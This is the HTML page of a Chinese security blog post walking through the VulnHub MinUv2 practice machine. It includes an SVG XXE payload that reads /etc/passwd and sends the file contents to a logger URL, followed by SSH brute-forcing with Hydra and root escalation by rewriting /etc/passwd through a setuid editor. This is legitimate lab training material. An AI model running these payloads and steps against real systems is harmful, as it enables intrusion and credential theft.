@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="©「哨兵」| Sentry Security" />
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="「渗透」SVG的神秘力量：minUv2 | ©「哨兵」| Sentry Security" />
+<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
+<meta property="og:image" content="http://localhost:80/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="http://localhost:80/blog/2019/minUv2/" />
+
+<title>「渗透」SVG的神秘力量：minUv2 | ©「哨兵」| Sentry Security</title>
+
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+
+<!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+</head>
+
+
+    <body>
+        <!-- Fixed navbar -->
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/"><!--
+   --><picture>
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  </picture>
+ Sentry Security</a>
+    </div>
+    <div class="navbar-collapse collapse navbar-right">
+      <ul class="nav navbar-nav">
+        <li ><a href="/">HOME</a></li>
+        <li class="active"><a href="/blog/">BLOG</a></li>
+        <li><a href="http://wiki.sentrylab.cn">WIKI</a></li>
+        <li><a href="https://about.sentrylab.cn">ABOUT ME</a></li>
+      </ul>
+    </div><!--/.nav-collapse -->
+  </div>
+</div>
+
+
+            <div class="container mtb">
+    <div class="row">
+        <! -- SINGLE POST -->
+        <div class="col-lg-8">
+            <! -- Blog Post  -->
+            <a href="/blog/2019/minUv2/"><h3 class="ctitle">「渗透」SVG的神秘力量：minUv2</h3></a>
+            <p><csmall>Sep 1, 2019. | By: Bin4xin</csmall></p>
+            <div class="post-content"> 
+            <h1 id="序言">序言</h1>
+<p>hello,各位。最近闲来无事，工作之余偷偷用公司电脑测试入侵了一个linux靶机，遂记录下。（手动狗头）
+这个靶机本身难度适中，复现了svg的代码执行漏洞且要求对linux的系统命令较为熟悉；svg大体来说是一种图像文件格式，基于XML，由W3C联盟进行开发的，支持网页打开，编辑方便等。可以自行深入搜索~各位大佬见笑。</p>
+<h2 id="一靶机简介">一、靶机简介</h2>
+<p>minUv2下载地址:<br />
+<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z">Download (Mirror)</a>
+<br />
+<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z.torrent">Download (Torrent)</a>
+<br /></p>
+<h2 id="二实战">二、实战</h2>
+<p>江湖规矩，神器开路：首先先用<code class="language-plaintext highlighter-rouge">Nmap</code>扫描确定靶机地址。发现靶机ip。
+这里靶机只支持vbox，所以得桥接通信，打码请谅解~<br />
+<img src="https://p2.ssl.qhimg.com/t0167faf934cb9977ca.png" alt="" /><br />
+确定ip直接端口扫描~
+<img src="https://p4.ssl.qhimg.com/t011687f39e33bbe3e4.png" alt="" />
+发现只开放了两个端口：<code class="language-plaintext highlighter-rouge">22、3306</code>端口。22端口暂时先放着不管，咱们看看3306端口。
+是一个web页面，emmmm.主角登场，svg图像~
+<img src="https://p0.ssl.qhimg.com/t019035849ce7a48ccf.png" alt="" /></p>
+<h2 id="三发现漏洞">三、发现漏洞</h2>
+<p>小弟赶紧dirb扫描一波，果然有发现。<br /></p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#扫描3306端口下的html后缀的文件</span><span class="w">
+</span><span class="nv">dirb</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="w"> </span><span class="o">-</span><span class="nv">X</span><span class="w"> </span><span class="p">.</span><span class="nv">html</span><span class="w">
+</span><span class="c1">--------------</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="o">/</span><span class="nv">upload</span><span class="p">.</span><span class="nv">html</span><span class="w"> </span><span class="p">(</span><span class="nv">CODE</span><span class="p">:</span><span class="mi">200</span><span class="err">|</span><span class="nv">SIZE</span><span class="p">:</span><span class="mi">908</span><span class="p">)</span><span class="w">
+</span><span class="c1">--------------</span><span class="w">
+</span><span class="nv">DOWNLOADED</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">FOUND</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></code></pre></div></div>
+<p>发现了上传网页，且只能上传svg、img文件，又惊又喜。exp搜索一哈找到poc，验证一下漏洞的存在。poc代码如下：</p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#poc上传上去页面回显</span><span class="w">
+</span><span class="c1">#&lt;!DOCTYPE svg [</span><span class="w">
+</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ELEMENT</span><span class="w"> </span><span class="nv">svg</span><span class="w"> </span><span class="nv">ANY</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ENTITY</span><span class="w"> </span><span class="nv">xxe</span><span class="w"> </span><span class="nv">SYSTEM</span><span class="w"> </span><span class="s2">"/etc/passwd"</span><span class="o">&gt;</span><span class="w">
+</span><span class="err">]</span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">svg</span><span class="w"> </span><span class="nb">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s2">"19000px"</span><span class="w"> </span><span class="nv">xmlns</span><span class="p">:</span><span class="nv">xlink</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xlink"</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nb">text</span><span class="w"> </span><span class="nv">x</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="nv">y</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="nv">xxe</span><span class="err">;</span><span class="o">&lt;/</span><span class="nb">text</span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">circle</span><span class="w"> </span><span class="nv">cx</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">cy</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">r</span><span class="o">=</span><span class="s2">"40"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">=</span><span class="s2">"black"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">-</span><span class="na">width</span><span class="o">=</span><span class="s2">"3"</span><span class="w"> 		</span><span class="nv">fill</span><span class="o">=</span><span class="s2">"red"</span><span class="w"> </span><span class="o">/&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">script</span><span class="o">&gt;</span><span class="w">
+</span><span class="nv">var</span><span class="w"> </span><span class="nv">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost/?file="</span><span class="w"> </span><span class="o">+</span><span class="w">
+</span><span class="nv">encodeURIComponent</span><span class="p">(</span><span class="na">document</span><span class="p">.</span><span class="nv">getElementsByTagName</span><span class="p">(</span><span class="s2">"text"</span><span class="p">)</span><span class="w">	</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">.</span><span class="nv">innerHTML</span><span class="p">)</span><span class="err">;</span><span class="w">
+</span><span class="na">document</span><span class="p">.</span><span class="nv">createElementNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">2000</span><span class="o">/</span><span class="nv">svg</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="na">image</span><span class="err">'</span><span class="p">).</span><span class="nv">setAttributeNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">1999</span><span class="o">/</span><span class="nv">xlink</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="nv">href</span><span class="err">'</span><span class="p">,</span><span class="w"> </span><span class="nv">logger</span><span class="p">)</span><span class="err">;</span><span class="w">
+</span><span class="o">&lt;/</span><span class="nv">script</span><span class="o">&gt;&lt;/</span><span class="nv">svg</span><span class="o">&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p><br />
+果然有<code class="language-plaintext highlighter-rouge">xxe</code>漏洞，但是验证了漏洞不能让我们有实际的渗透进展，只能对一些文件内容进行查看，无法得到shell，要怎么办呢？</p>
+
+<p><img src="https://p1.ssl.qhimg.com/t0163eb735e597071e2.png" alt="" /></p>
+
+<h2 id="四get-shell">四、get shell</h2>
+<p>就在小弟愁眉苦脸的时候，忽然看到最后一行用户名的进程是/bin/ash，想到bash shell会有历史纪录，赶紧重新上传一个poc验证想法。回显内容：<br /></p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"./ash.history"</span><span class="err">获取~</span><span class="w">
+</span><span class="nv">Useradd</span><span class="w"> </span><span class="err">–</span><span class="nv">D</span><span class="w"> </span><span class="nv">bossdonttrackme</span><span class="w"> </span><span class="err">–</span><span class="nv">p</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="w">
+</span></code></pre></div></div>
+<p>根据所得的内容生成用户字典（passwd回显的用户名），密码字典。用Hydra跑一下。</p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##hydra -L /root/Documents/test/minu/use.txt -P /root/Documents/test/minu/passwd.txt ssh://$_ip</span><span class="w">
+</span><span class="nv">Hydra</span><span class="w"> </span><span class="nv">v8</span><span class="p">.</span><span class="mf">9.1</span><span class="w"> </span><span class="p">(</span><span class="nv">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nv">van</span><span class="w"> </span><span class="nv">Hauser</span><span class="o">/</span><span class="nv">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">Please</span><span class="w"> </span><span class="nv">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nv">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> 
+</span><span class="nv">secret</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="nb">for</span><span class="w"> </span><span class="nv">illegal</span><span class="w"> </span><span class="nv">purposes</span><span class="p">.</span><span class="w">
+</span><span class="err">[</span><span class="nv">WARNING</span><span class="err">]</span><span class="w"> </span><span class="nv">Many</span><span class="w"> </span><span class="nv">SSH</span><span class="w"> </span><span class="nv">configurations</span><span class="w"> </span><span class="nv">limit</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nv">parallel</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="k">it</span><span class="w"> </span><span class="ow">is</span><span class="w">
+</span><span class="nv">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nv">reduce</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">tasks</span><span class="p">:</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="o">-</span><span class="nv">t</span><span class="w"> </span><span class="mi">4</span><span class="w">	</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">server</span><span class="p">,</span><span class="w"> </span><span class="nv">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="nv">login</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="p">(</span><span class="nv">l</span><span class="p">:</span><span class="mi">30</span><span class="o">/</span><span class="nv">p</span><span class="p">:</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="err">~</span><span class="mi">2</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="nv">task</span><span class="w">
+</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">attacking</span><span class="w"> </span><span class="nv">ssh</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="mi">22</span><span class="o">/</span><span class="w">
+</span><span class="err">[</span><span class="mi">22</span><span class="err">][</span><span class="nv">ssh</span><span class="err">]</span><span class="w"> </span><span class="nv">host</span><span class="p">:</span><span class="w"> </span><span class="err">$_</span><span class="nv">ip</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nv">login</span><span class="p">:</span><span class="w"> </span><span class="nv">employee</span><span class="w"> </span><span class="nv">password</span><span class="p">:</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="o">**</span><span class="w">
+</span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="na">target</span><span class="w"> </span><span class="nv">successfully</span><span class="w"> </span><span class="nv">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">valid</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">found</span><span class="w">
+</span><span class="c1">##跑出来账号密码employee：uperultrapass3，ssh连上去。</span><span class="w">
+</span><span class="c1">##连接上去查看一下基本信息 </span><span class="w">
+</span><span class="nv">ssh</span><span class="w"> </span><span class="nv">employee</span><span class="err">@</span><span class="nv">ip</span><span class="w">
+</span><span class="nv">whoami</span><span class="w">
+</span><span class="na">id</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nv">find</span><span class="w"> </span><span class="o">-</span><span class="nv">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">null</span><span class="w">
+</span></code></pre></div></div>
+<p><img src="https://p5.ssl.qhimg.com/t013dbd6663c5c9720e.png" alt="" /></p>
+<h2 id="五提权">五、提权</h2>
+<p>发现<code class="language-plaintext highlighter-rouge">micro</code>和<code class="language-plaintext highlighter-rouge">bbsuid</code>不需要高权限，运行一下，发现micro是一个<code class="language-plaintext highlighter-rouge">文本编辑工具器</code>。接下来就简单了。</p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#生成一份hash值，替换掉passwd的用户密码，这样密码就已知了。</span><span class="w">
+</span><span class="c1">#用micro编辑器打开passwd文件，替换root密码保存即可</span><span class="w">
+</span><span class="nv">passwd</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="nv">salty</span><span class="w"> </span><span class="nv">root</span><span class="w"> </span><span class="nv">admin123</span><span class="p">(</span><span class="err">随意</span><span class="p">)</span><span class="w">
+</span><span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span><span class="w"> </span><span class="err">|</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">micro</span><span class="w">
+</span></code></pre></div></div>
+<p><img src="https://p5.ssl.qhimg.com/t0198aaa755e6394b0f.png" alt="" />
+这样我们就已知root密码了，直接切换用户</p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">minuv2</span><span class="p">:</span><span class="err">~$</span><span class="w"> </span><span class="nv">su</span><span class="w"> </span><span class="nv">root</span><span class="w">
+</span><span class="nv">Password</span><span class="p">:</span><span class="w"> 
+</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1"># whoami</span><span class="w">
+</span><span class="nv">root</span><span class="w">
+</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1">#</span><span class="w">
+</span></code></pre></div></div>
+<p><img src="https://p2.ssl.qhimg.com/t01aefe59b403bdcc5c.png" alt="" />
+获得flag~感谢各位</p>
+
+
+            </div>
+            <div class="spacing"></div>
+        </div><! --/col-lg-8 -->
+        
+        <div class="col-lg-3">
+    <h4>Subscribe</h4>
+    <div class="hline"></div>
+        <p>
+        <p class="rss-subscribe"><i class="fa fa-rss"></i> Subscribe to this blog <a href="/feed.xml">via RSS</a>.</p>
+        </p>
+    <div class="spacing"></div>
+    <h4>Categories</h4>
+    <div class="hline"></div>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Web</a>
+            <span class="badge badge-theme pull-right">12</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 漏洞复现</a>
+            <span class="badge badge-theme pull-right">12</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 渗透</a>
+            <span class="badge badge-theme pull-right">10</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Vulnhub</a>
+            <span class="badge badge-theme pull-right">10</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 安全工具</a>
+            <span class="badge badge-theme pull-right">6</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 笔记</a>
+            <span class="badge badge-theme pull-right">40</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 软件移植</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Arm</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 主动防御</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 技巧</a>
+            <span class="badge badge-theme pull-right">3</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Android reverse</a>
+            <span class="badge badge-theme pull-right">6</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 排错</a>
+            <span class="badge badge-theme pull-right">3</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Waf</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Maven</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 代码审计</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Python</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 机器学习</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Terminal</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Docker</a>
+            <span class="badge badge-theme pull-right">3</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Cve</a>
+            <span class="badge badge-theme pull-right">9</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Sql-inject</a>
+            <span class="badge badge-theme pull-right">3</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Bash</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 内网</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> 信息搜集</a>
+            <span class="badge badge-theme pull-right">7</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Fuzz</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Src</a>
+            <span class="badge badge-theme pull-right">3</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Vulnhub</a>
+            <span class="badge badge-theme pull-right">2</span>
+        </p>
+    
+        <p>
+            <a href=""><i class="fa fa-angle-right"></i> Php</a>
+            <span class="badge badge-theme pull-right">1</span>
+        </p>
+    
+
+    <div class="spacing"></div>
+
+    <h4>Popular Tags</h4>
+    <div class="hline"></div>
+    <p>
+        
+            <a class="btn btn-theme" href="" role="button">Web (12)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">漏洞复现 (12)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">渗透 (10)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Vulnhub (10)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">安全工具 (6)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">笔记 (40)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">软件移植 (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Arm (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">主动防御 (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">技巧 (3)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Android reverse (6)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">排错 (3)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Waf (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Maven (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">代码审计 (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Python (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">机器学习 (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Terminal (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Docker (3)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Cve (9)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Sql-inject (3)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Bash (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">内网 (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">信息搜集 (7)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Fuzz (1)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Src (3)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Vulnhub (2)</a>	         
+        
+            <a class="btn btn-theme" href="" role="button">Php (1)</a>	         
+        
+    </p>
+</div>
+
+
+    </div><! --/row -->
+</div><! --/container -->
+
+
+        <div id="footerwrap">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-4">
+                <p>本站由哨兵安全实验室支持创办</p>
+                <p class="thuhidden">个人感谢<em>@TUNA协会</em>的开源代码</p>
+        <p class="thuhidden">Powered by <a href="https://github.com/Bin4xin">Bin4xin</a> &amp; <a title="open code from TUNA mirror-web." href="https://github.com/tuna/mirror-web"><em>这里是开源代码库</em></a>.</p>
+            </div>
+
+            <div class="col-sm-4">
+              <h4>有个不成熟的建议？联系：</h4>
+                  <div class="thuhidden">
+                    <ul class="social">
+                      <li>
+                      <a><i class="fa fa-envelope"></i> chihou.pro@gmail.com</a>
+                      </li>
+                      <!-- <li>
+                      IRC: <a href="https://webchat.freenode.net/?channels=%23tuna">#tuna at freenode</a>
+                      </li> -->
+                      <li>
+                      <a href="https://github.com/Bin4xin/"><i class="fa fa-github"></i> GitHub </a>
+                      </li>
+                      <!-- <li>
+                      <a href="http://weibo.com/u/5402274706"><i class="fa fa-weibo"></i> 新浪微博</a>
+                      </li> -->
+                    </ul>
+                  </div>
+                </div>
+            <!-- aaa-->
+            <div class="col-sm-4">
+              <picture>
+  <img src="/assets/img/logo-white.jpg" srcset="/assets/img/logo-white.png 1x, /assets/img/logo-white@2x.png 2x, /assets/img/logo-white@3x.png 3x, /assets/img/logo-white@4x.png 4x" />
+  </picture>
+
+              <p style="color: #384452"> The best team on the planet. </p>
+            </div>
+        </div><!--/row -->
+    </div><!--/container -->
+</div><!--/footerwrap -->
+
+    </body>
+</html>
